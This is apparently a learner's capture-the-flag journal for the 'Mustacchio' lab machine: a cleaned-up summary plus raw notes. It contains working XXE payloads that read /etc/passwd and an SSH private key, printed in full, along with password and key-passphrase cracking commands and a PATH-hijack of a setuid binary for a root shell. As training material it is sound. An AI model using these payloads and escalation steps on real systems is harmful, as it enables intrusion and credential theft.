# CTF Journal Entry: Mustacchio (IP: 10.201.90.250)

**Challenge Rating:** Medium  

**Challenge:**  
This machine revolves around reconnaissance, file discovery, web application analysis, cracking hashes, and exploiting XML External Entity (XXE) vulnerabilities to extract sensitive data. It highlights common misconfigurations like accessible backup files, improperly secured SSH keys, and vulnerable XML parsers.

---

## Skills Demonstrated:
- VPN setup for lab access  
- Reconnaissance with Nmap, Zenmap, Rustscan  
- Directory brute-forcing with Gobuster, Feroxbuster, FFUF  
- File analysis (`.bak` → SQLite DB, `strings`, `sqlite3`)  
- Credential extraction & hash cracking with **John the Ripper** and **Hashcat**  
- Login testing with **SSH**, `sshpass`, and `curl`  
- Web enumeration on custom ports (80, 8765)  
- Vulnerability exploitation using **XXE (XML External Entity)**  
- Extracting SSH private keys via XXE payloads  
- Cracking SSH private key passphrase with `ssh2john` + John  
- Privilege escalation enumeration (`strings`, setuid binary analysis)  

---

## Notes

### Initial Recon
- Target: `10.201.90.250`  
- Scanned with Zenmap and Rustscan → Open ports:  
  - **22/tcp SSH**  
  - **80/tcp HTTP**  
  - **8765/tcp HTTP**  

- Website showed filler text, robots.txt blocked (`Disallow: /`).  

### Enumeration
- Ran Gobuster & Feroxbuster → discovered `user.bak`.  
- File was SQLite DB with table `users (username, password)`.  
- Extracted admin hash:  
  ```
  admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
  ```  

- Cracked with John (rockyou.txt):  
  ```
  admin : bulldog19
  ```  

### SSH Attempts
- Tried SSH login with credentials → failed (publickey required).  
- Discovered web login on `http://10.201.90.250:8765`.  
- Logged in using `admin : bulldog19`.  

### Discovery & XXE Exploitation
- Source code hints:  
  ```html
  <!-- Barry, you can now SSH in using your key!-->
  ```  

- Discovered `/auth/dontforget.bak` (XML file).  
- Hints toward XML parsing.  

- Confirmed XXE vulnerability with payloads:  
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY example SYSTEM "file:///home/barry/.ssh/id_rsa">
  ]>
  <r>
    <name>&example;</name>
  </r>
  ```  

- Successfully extracted **Barry’s SSH private key** (encrypted).  

### Cracking SSH Private Key
- Converted key for John:  
  ```bash
  python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  ```  

- Cracked passphrase: **urieljames**  

- SSH access gained:  
  ```bash
  ssh barry@10.201.90.250 -i id_rsa
  ```  

### User Flag
- Retrieved `user.txt`:  
  ```
  62d77a4d5f97d47c5aa38b3b2651b831
  ```  

### Privilege Escalation Enumeration
- Found `live_log` setuid binary in `/home/joe/`:  
  ```
  Live Nginx Log Reader → calls tail -f /var/log/nginx/access.log
  ```  
- Possible vector for privesc (further analysis needed).  

---

## Takeaways
- Always check for `.bak` and `.db` files → often contain credentials.  
- Don’t overlook custom ports like 8765 → admin panels may hide there.  
- XXE is powerful for **local file disclosure**.  
- SSH private keys may require **passphrase cracking**.  
- Privilege escalation often lies in **setuid binaries**.  

---
orginial notes:
<details>
IP: “10.201.90.250”

set up vpn

ran an zenmap and rustscan

looked at website - goes to a muscathio site

robots.txt =

User-agent: *

Disallow: /

the rest of the site has latin junk writting as filler

ports open:

22 tcp ssh

80 tcp http

8765 tcp http

ran my custom scans with my python code

says port 22 ssh is open, check banners nad maybe brute force it

80 run gobuster/feroxbuster and check header with curl and nikto

NOTE: What is nikto? look this up

ran feroxbuster and ffuf

ssh timed out, don't know the info to login yet

found a user.bak file in http://10.201.63.19/custom/js/

thanks gobuster

looking at thefile we see it's a sqlite format 3

using the strings command we see:

SQLite format 3

tableusersusers

CREATE TABLE users(username text NOT NULL, password text NOT NULL)

]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

tried the data after admin on cyberchef but nothing

when we ssh into the sitre with admin we get permission denied to to publickey

ok, so let's look at users.bak with sqlite3

google says to make the users.bak into a database by typing:

cp users.bak users.db

these are the recommend commands from chatgpt

# copy to a .db filename (optional)

cp users.bak users.db

# list tables

sqlite3 users.db ".tables"

(shows users as a table)

# show schema

sqlite3 users.db ".schema users"

(shows CREATE TABLE users(username text NOT NULL, password text NOT NULL);)

# dump rows

sqlite3 users.db "SELECT * FROM users;"

# or pretty

sqlite3 -header -column users.db "SELECT * FROM users;"

shows:

username password

-------- ----------------------------------------

admin 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

lets try them

i believe we're doing this to make ti a database, since this is a copy of one, then we can use it to view the data inside and get user names and passwords---hopefully

so we have a username and pass, let's try this on ssh

some notes on ssh with pasword:

sshpass -ffilename ssh user@ip # prefer this

sshpass -pPa5sw0rd ssh user@ip # avoid this

where your password is in the first line of the file filename or it is literally Pa5sw0rd. Notes:

In the manual there is no space after -p or -f, but at least sshpass 1.06 in my Debian 10 allows it; your sshpass may or may not.

If your password contains characters your shell will interpret (like $, ' or ;) then you should quote it properly in the command line (but not in the file).

Avoid -p, prefer -f. Use chmod 600 filename to make the file private (root will still be able to access it though). Read about security considerations in the manual.

had to install sshpass - didn';t work

notes from chatgpt pervious say to use:

sqlite3 users.db "SELECT username || ':' || password FROM users;" > hashes.txt

sqlite3 users.db "SELECT username, password FROM users;" > userlist.txt

do this to create a file for cracking. ok then, done

NOTE TO SELF: Make a folder for room downlaods and cracks, making my downloads folder crowded for no reason

so we have these now, now what

since we have a hash for hte passowrd,we need to crack it.

we can use either john the ripper or hashcast

John the ripper code:

# make a file with just the hash (or user:hash). If user:hash use --format=raw-sha1

echo 'admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b' > john_hashes.txt

john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 john_hashes.txt

(easy peasy, for the password of “bulldog19” for admin)

john --show john_hashes.txt # after it runs, shows cracked passwords

I did the hashcast stuff just to try it.

# put the raw hash in a file (one per line)

echo '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b' > hashcat.txt

# mode 100 = SHA1

hashcat -m 100 -a 0 hashcat.txt /usr/share/wordlists/rockyou.txt

# show cracked

hashcat -m 100 --show hashcat.txt

i perfer john the ripper

dang, forgot to renew the timer and my machine expired

ssh seems to fail

does the website have a login? that wird 8765 port. try curl? curl transfer data via http, https, ftp and others so maybe

google says try this for login for curl

curl -u username:password https://www.example.com/protected-resource

curl -u admin:bulldog19 https://10.201.21.183

curl failedf or me but snap! http://10.201.21.183:8765/ worked and took me to a page to login!

so we're in the admin panel wit ha commenton teh website button

in the page source we see

<!-- Barry, you can now SSH in using your key!-->

curl -i -X POST -d "username=admin&password=bulldog19" http://10.201.21.183:8765/login

gobuster dir -u http://10.201.21.183:8765 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,sql,bak,zip

sitemap.xml and robots.txt don't work

umm where to go from here

sqlmap -u "http://10.201.21.183:8765 " --data="username=admin&password=bulldog19" --batch --level=3 --risk=2

saw a recommendation for sqlmap, giving it a try and seeing

hint that an SSH key exists somewhere on the serve</body></html>

//document.cookie = "Example=/auth/dontforget.bak";</span></pre></body></html>

what does that mean, gotta be useful

put it at the end of the ip and got

http://10.201.1.119:8765/auth/dontforget.bak

got another file!

ok so we xxd, cat, file, and look at it

comment>

<name>Joe Hamd</name>

<author>Barry Clad</author>

<com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>

</comment>

it's a null paragraph

it's a xml file

we seen the name barry before

the author is joe hamd

a recommendation I found is to make a Automated cookie-file-disclosure check

It tries several likely paths across common ports (8765, 8764, 80) and saves any responses that look like private keys or interesting text.

Automated cookie-file-disclosure checks

Run this script (save as check_files.sh, chmod +x check_files.sh, then ./check_files.sh). It tries several likely paths across common ports (8765, 8764, 80) and saves any responses that look like private keys or interesting text.

still haven't found anything

we know barry, let's try using barry as a user and ffuf the password

try using for passwords:

ffuf -w /usr/share/seclists/Passwords/bt4-password.txt \

-u "http://10.201.1.119:8765" \

-X POST \

-H "Content-Type: application/x-www-form-urlencoded" \

-d "username=barry&password=FUZZ" \

-mc 302

made a curl script for finding out info, didn't find much

that said, on teh login page there was a note that said:

sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf

so, i did some digging, we looked into the code and there ias a github with all things payload

we noticed that a hint earlier was xml and xxe/xee stuff, new to me but let's learn mofo!

so i did noticed that when on the admin site earlier that when you enter a comment it says “insert xml code!”

so, we have an area to insert xml data, and we noticed that the letter is a certain format. it looks similar to the

so the payload site says how to detect the vulnetability

someone online stated that the ssh key would be user .ssh/id_rsa, which i noteid before, as it that is where key ids were stored and i've seen that before. the address recommend to look at on teh site was /home/user/ .shh/id_rsa, the code used was:

<?xml version="1.0"?>

<!DOCTYPE foo [

<!ELEMENT foo ANY >

<!ENTITY nop SYSTEM "file:///home/barry/.ssh/id_rsa" >

]>

<feed>

<name>&nop;</name>

<Subject>nop</Subject>

<Content>nop</Content>

</feed>

the response was:

Name: -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY-----

this gues is the ssh key we needed, but why.

looking into ti we do have the ssh key, but it is encrypted

Users commonly protect private keys with a passphrase so if someone steals the key file they still need the passphrase to use it. HTB/CTF boxes often put an encrypted key on disk and you must find the passphrase somewhere (web app, files, credentials) or crack it.

Key points:

<!DOCTYPE foo [ ... ]> defines an inline DTD (Document Type Definition) inside the XML you sent.

<!ENTITY nop SYSTEM "file:///home/barry/.ssh/id_rsa"> declares an external entity named nop whose contents come from the local file at file:///home/barry/.ssh/id_rsa.

Inside the <name> element you reference &nop; — that tells the XML parser: “replace this token with the contents of the nop entity.”

If the server uses an XML parser that allows external entities (and is running with permission to read local files), it will fetch and expand &nop; by reading /home/barry/.ssh/id_rsa and insert the file content into the parsed document or the output the app returns.

This technique is called XXE (XML External Entity) — local file disclosure. It leverages the XML parser’s feature to load external entities and forces it to read local files.

Why the server returned the private key

The web app accepted whatever XML you submitted and apparently parsed/echoed parts of it back to the HTTP response (or logged it and showed it).

Because your payload caused the parser to expand the entity to the contents of the key file, the private key text became part of the server-generated output and was sent back to your browser or curl response.

The private key header shows Proc-Type: 4,ENCRYPTED because the key file itself was passphrase-encrypted on disk. XXE returned the raw file contents — which is why you saw the encrypted PEM text but couldn’t immediately use it.

The admin page comment

The HTML comment <!-- Barry, you can now SSH in using your key!--> is a direct hint that a user named Barry has an SSH key on the machine. CTF authors commonly leave such breadcrumbs.

dontforget.bak contents

The dontforget.bak XML you found included <author>Barry Clad</author>. That reinforces the existence of a barry user or account.

From those hints it’s common sense to try ~barry/.ssh/id_rsa (the standard private key filename).

Why the server was vulnerable (what misconfiguration exists)

The app accepts user-supplied XML and passes it to an XML parser that resolves external entities (this is the classic vulnerability).

Modern secure configurations disable external entity resolution or use parsers configured to forbid file: or http: SYSTEM entities.

The server also (implicitly) returned or reflected parsed XML content to you, rather than sanitizing it — allowing exfiltration.

You already saw a form named xml and a textarea that asks for XML — that strongly suggests the server parses XML input.

Combined with the JS comment about document.cookie = "Example=/auth/dontforget.bak"; and the dontforget.bak XML itself, the app hinted at reading local .bak files. When an app takes XML input and you can control the DTD, XXE is a natural technique to try.

So: visible interface (xml field) + breadcrumb hints (Barry, dontforget.bak, cookie) => try external-entity payloads.

so, I wanted to figure this shit out and was confused, then I realized that it's looking for a vulnerability to tells the xml to return info fomr a certain area, such as teh ssh key

the vulnerability example we got of

<!--?xml version="1.0" ?-->

<!DOCTYPE replace [<!ENTITY example "Doe"> ]>

<userInfo>

<firstName>John</firstName>

<lastName>&example;</lastName>

</userInfo>

needs to be edited

since we know from the payload notes that the info is declared outside the entity its an external entity and we need to use !entity = system.

we know that barry exists and the he used an ssh key to log in, and we know this from the previous notes, therefore, we know to look in the site there, looking at "file:///home/barry/.ssh/id_rsa">

i was confused on if the xxe would work at all, as the first edit i used didn't work, but when we try this:

<?xml version="1.0"?>

<!DOCTYPE test [

<!ELEMENT test ANY >

<!ENTITY safe SYSTEM "file:///etc/hostname">

]>

<test>

<name>&safe;</name>

</test>

we see it returned the hostname under the under name and references &safe

adn we see it works.

to make this work:

<?xml version="1.0"?>

<!DOCTYPE replace [

<!ELEMENT replace ANY >

<!ENTITY example SYSTEM "file:///home/barry/.ssh/id_rsa">

]>

<userInfo>

<firstName>John</firstName>

<lastName>&example;</lastName>

</userInfo>

we see that it's calling to areas that doen'st exist like last name and such, but if we change it to match what we see with name, author, and just use name instead, we should get an answer

<?xml version="1.0"?>

<!DOCTYPE replace [

<!ELEMENT replace ANY >

<!ENTITY example SYSTEM "file:///home/barry/.ssh/id_rsa">

]>

<userInfo>

<name>&example</name>

</userInfo>

I was messing up because I need the root element for doc type, it evne says replaced...idiot.

so replace with r for root

<?xml version="1.0"?>

<!DOCTYPE r [

<!ELEMENT r ANY >

<!ENTITY example SYSTEM "file:///home/barry/.ssh/id_rsa">

]>

<r>

<name>&example;</name>

</r>

and it works!

so, now that we have the key, let's save it and use it to login and then decypher it to use it

ssh barry@10.201.90.250 -i id_rsa

we try that and it has bad permssions

says our private key can NOT be accessible by others

lets change permissions

kinda stuck here

this code lets me know I can see values on the server, but I'm head of this but would have been nice to know

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>

<comment>

<name>Joe Hamd</name>

<author>Joe</author>

<com>&xxe;</com>

</comment>

found users joe and barry 1002 and 1003 respectively

GOT IT FUCK YEA - I'M AN IDIOT

I had to create a id_rsa file and make sure to copy it EXACTLY. Copying ffom the site didn't work

I ahd to highlight and open the source for it

then I copied it and typed it EXACTLY and nano saved 30 lines instead of 60. Now i'ts asking for a passcode! YES AS SHELDON WOULD SAY, MY BRAIN IS BETTER THA NEVERYONES!

ok, so not it's asking for the passphrase, lets get that

#Create a hash for John to crack

python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# Crack the Hash

sudo john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt

to crack it, we get:

Using default input encoding: UTF-8

Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])

Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes

Cost 2 (iteration count) is 1 for all loaded hashes

Will run 10 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

urieljames (id_rsa)

1g 0:00:00:00 DONE (2025-09-17 10:39) 2.083g/s 6188Kp/s 6188Kc/s 6188KC/s urieljr.k..uriel97

Use the "--show" option to display all of the cracked passwords reliably

Session completed.

urieljames is the passcode!

BOOM WE'RE IN

user.txt file = 62d77a4d5f97d47c5aa38b3b2651b831

first key

i don't think LinPEAS will work here, dang

so we changed users dir to joe and we see a live_log file

live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped

used the strings cmd

barry@mustacchio:/home/joe$ strings live_log

/lib64/ld-linux-x86-64.so.2

libc.so.6

setuid

printf

system

__cxa_finalize

setgid

__libc_start_main

GLIBC_2.2.5

_ITM_deregisterTMCloneTable

__gmon_start__

_ITM_registerTMCloneTable

u+UH

[]A\A]A^A_

Live Nginx Log Reader

tail -f /var/log/nginx/access.log

:*3$"

GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0

crtstuff.c

deregister_tm_clones

__do_global_dtors_aux

completed.8060

__do_global_dtors_aux_fini_array_entry

frame_dummy

__frame_dummy_init_array_entry

demo.c

__FRAME_END__

__init_array_end

_DYNAMIC

__init_array_start

__GNU_EH_FRAME_HDR

_GLOBAL_OFFSET_TABLE_

__libc_csu_fini

_ITM_deregisterTMCloneTable

_edata

system@@GLIBC_2.2.5

printf@@GLIBC_2.2.5

__libc_start_main@@GLIBC_2.2.5

__data_start

__gmon_start__

__dso_handle

_IO_stdin_used

__libc_csu_init

__bss_start

main

setgid@@GLIBC_2.2.5

__TMC_END__

_ITM_registerTMCloneTable

setuid@@GLIBC_2.2.5

__cxa_finalize@@GLIBC_2.2.5

.symtab

.strtab

.shstrtab

.interp

.note.gnu.property

.note.gnu.build-id

.note.ABI-tag

.gnu.hash

.dynsym

.dynstr

.gnu.version

.gnu.version_r

.rela.dyn

.rela.plt

.init

.plt.got

.plt.sec

.text

.fini

.rodata

.eh_frame_hdr

.eh_frame

.init_array

.fini_array

.dynamic

.data

.bss

.comment

we see the setuid which is interesting

then we see the binary is calling /var/log/nginx/access.log

also interesting

so it's using this and not setting a full path, so we can try an PE by using hte path method.

the PATH method seems like it would work due to:

Telltale signs you have a chance:

The binary is setuid / setgid (owner root and -rwsr-xr-x style permission or setgid bit).

The binary uses system() or popen() or exec* functions that search PATH (strings shows system/printf/tail).

The command being run in the binary is referenced as tail (no /usr/bin/tail) — not an absolute path. Your strings shows tail -f /var/log/nginx/access.log (no /usr/bin/tail), which is a huge hint.

The program echoes or otherwise lets you reach functionality that triggers the external program run.

The environment is not fully sanitized (some setuid binaries still honor PATH).

strings found setuid and setgid symbols → likely the binary is installed with elevated privileges.

strings also found system and printf and literal tail -f /var/log/nginx/access.log. A system() call typically runs /bin/sh -c "tail -f ...". /bin/sh will search PATH to find tail if the command is not given as an absolute path. If the binary runs as root and does not sanitize PATH, you can put your own tail earlier in PATH and get it executed as root.

ls -l ./live_log

-rwsr-xr-x 1 root root 16832 Jun 12 2021 ./live_log

root, nice

arry@mustacchio:/home/joe$ stat ./live_log

File: './live_log'

Size: 16832 Blocks: 40 IO Block: 4096 regular file

Device: ca01h/51713d Inode: 257605 Links: 1

Access: (4755/-rwsr-xr-x) Uid: ( 0/ root) Gid: ( 0/ root)

0 = also nice

so we echo PATH$ adn we see

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

so we see the path nad now let's make a temp folder to jump in front

change to the tmp folder

so we go tthere and create a file that echos /bin/bash to give us bin/bash rights and we name ti tail

then we change teh rights for the file

barry@mustacchio:/tmp$ echo "/bin/bash" > tail

barry@mustacchio:/tmp$ chmod 777 tail

now we export it

export PATH=/tmp:$PATH

barry@mustacchio:/tmp$ export PATH=/tmp:$PATH

barry@mustacchio:/tmp$ cd /home/joe/

barry@mustacchio:/home/joe$ ./live_log

root@mustacchio:/home/joe#

and now we see that we have permissions as joe for sudo with sudo -l

we ran the .live_log file and thus we got the /bin/bash permissions and we can execute commands

so i had this a little backwards, we noticed that setuid live_log was ran when this file was used and we want that

we used /bin/bash to get a shell, and when we run the file it normallly doesn't but this time it gave us bash/shell rights

live_log was a privileged binary (setuid/setgid). It called an external program (tail) via a shell/system call without using an absolute path. By putting an executable named tail earlier in PATH (in /tmp or /tmp/exp), when live_log invoked tail the kernel executed your program — but it ran with live_log’s effective privileges (root), so your program ran as root and gave you a root shell.

Clean, correct statement you can save

live_log is a setuid-root binary that calls tail via system() (or similar) without an absolute path. By creating an executable tail and placing it at the front of $PATH, we caused live_log to execute our tail script as root. That script spawned /bin/bash -p, which gave us a root shell.

root@mustacchio:/home/joe# cat /root/root.txt<br>3223581420d9.........</span></pre></body></html>

3223581420d9.........</span></pre></body></html>

got it! room done!
</details>


